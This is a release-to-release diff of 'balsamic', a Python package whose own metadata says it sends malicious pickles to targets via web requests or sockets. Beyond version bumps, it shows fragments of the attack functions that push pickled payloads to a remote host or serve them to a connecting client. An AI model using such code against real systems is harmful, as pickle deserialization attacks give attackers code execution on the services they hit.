# Comparing `tmp/balsamic-0.2.91.tar.gz` & `tmp/balsamic-0.2.92.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "balsamic-0.2.91.tar", last modified: Fri May 24 22:50:47 2024, max compression
+gzip compressed data, was "balsamic-0.2.92.tar", last modified: Wed May 29 02:32:18 2024, max compression
```

## Comparing `balsamic-0.2.91.tar` & `balsamic-0.2.92.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-24 22:50:47.407158 balsamic-0.2.91/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2444 2024-05-24 22:50:47.407158 balsamic-0.2.91/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1909 2024-05-24 22:38:35.000000 balsamic-0.2.91/README.md
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-24 22:50:47.403158 balsamic-0.2.91/balsamic/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-24 22:35:48.000000 balsamic-0.2.91/balsamic/__innit__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2603 2024-05-24 22:35:48.000000 balsamic-0.2.91/balsamic/__main__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2962 2024-05-24 22:50:19.000000 balsamic-0.2.91/balsamic/balsamic.py
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-24 22:50:47.403158 balsamic-0.2.91/balsamic.egg-info/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2444 2024-05-24 22:50:47.000000 balsamic-0.2.91/balsamic.egg-info/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-24 22:50:47.000000 balsamic-0.2.91/balsamic.egg-info/SOURCES.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-24 22:50:47.000000 balsamic-0.2.91/balsamic.egg-info/dependency_links.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-24 22:50:47.000000 balsamic-0.2.91/balsamic.egg-info/requires.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-24 22:50:47.000000 balsamic-0.2.91/balsamic.egg-info/top_level.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-24 22:50:47.407158 balsamic-0.2.91/setup.cfg
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1145 2024-05-24 22:50:32.000000 balsamic-0.2.91/setup.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-29 02:32:18.601686 balsamic-0.2.92/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2444 2024-05-29 02:32:18.601686 balsamic-0.2.92/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1909 2024-05-24 22:38:35.000000 balsamic-0.2.92/README.md
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-29 02:32:18.601686 balsamic-0.2.92/balsamic/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-24 22:35:48.000000 balsamic-0.2.92/balsamic/__innit__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     6176 2024-05-25 01:55:23.000000 balsamic-0.2.92/balsamic/__main__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2876 2024-05-29 02:28:52.000000 balsamic-0.2.92/balsamic/balsamic.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-29 02:32:18.601686 balsamic-0.2.92/balsamic.egg-info/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2444 2024-05-29 02:32:18.000000 balsamic-0.2.92/balsamic.egg-info/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-29 02:32:18.000000 balsamic-0.2.92/balsamic.egg-info/SOURCES.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-29 02:32:18.000000 balsamic-0.2.92/balsamic.egg-info/dependency_links.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-29 02:32:18.000000 balsamic-0.2.92/balsamic.egg-info/requires.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-29 02:32:18.000000 balsamic-0.2.92/balsamic.egg-info/top_level.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-29 02:32:18.601686 balsamic-0.2.92/setup.cfg
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1145 2024-05-29 02:31:57.000000 balsamic-0.2.92/setup.py
```

### Comparing `balsamic-0.2.91/PKG-INFO` & `balsamic-0.2.92/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.2.91
+Version: 0.2.92
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `balsamic-0.2.91/README.md` & `balsamic-0.2.92/README.md`

 * *Files identical despite different names*

### Comparing `balsamic-0.2.91/balsamic/balsamic.py` & `balsamic-0.2.92/balsamic/balsamic.py`

 * *Files 3% similar despite different names*

```diff
@@ -57,32 +57,28 @@
             url,
             cookies={cook: payload} if cook else None,
             headers=headers
         )
     return f"Firing webreq attack against {url}"
 
 def socksend(rhost, rport, payload, enc, steps=0, use_ipv6=False):
-    if command:
-        updatecmd(command)
     rport = int(rport)
     steps = int(steps)
     payload = Utility.b64pickle(payload) if enc else Utility.plainpickle(payload)
     family = socket.AF_INET6 if use_ipv6 else socket.AF_INET
     with socket.socket(family, socket.SOCK_STREAM) as s:
         s.connect((rhost, rport))
         for _ in range(steps):
             s.sendall(b"arb")
             s.recv(1024)
         s.sendall(payload)
         s.close()
 
 
 def socklisten(lport, payload, enc, steps=0, use_ipv6=False):
-    if command:
-        updatecmd(command)
     lport = int(lport)
     steps = int(steps)
     payload = Utility.b64pickle(payload) if enc else Utility.plainpickle(payload)
     family = socket.AF_INET6 if use_ipv6 else socket.AF_INET
     with socket.socket(family, socket.SOCK_STREAM) as s:
         s.bind(('localhost', lport))  # Bind to localhost or a specific IP address
         s.listen(1)
```

### Comparing `balsamic-0.2.91/balsamic.egg-info/PKG-INFO` & `balsamic-0.2.92/balsamic.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.2.91
+Version: 0.2.92
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `balsamic-0.2.91/setup.py` & `balsamic-0.2.92/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -3,15 +3,15 @@
 import os
 
 here = os.path.abspath(os.path.dirname(__file__))
 
 with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
     long_description = "\n" + fh.read()
 
-VERSION = '0.2.091'
+VERSION = '0.2.092'
 DESCRIPTION = 'Send malicious pickles via requests or sockets'
 LONG_DESCRIPTION = 'A package that allows the user to easily send out malicious pickles, via web requests, or a malicious server or client(currently ipv4 only)'
 
 # Setting up
 setup(
     name="balsamic",
     version=VERSION,
```

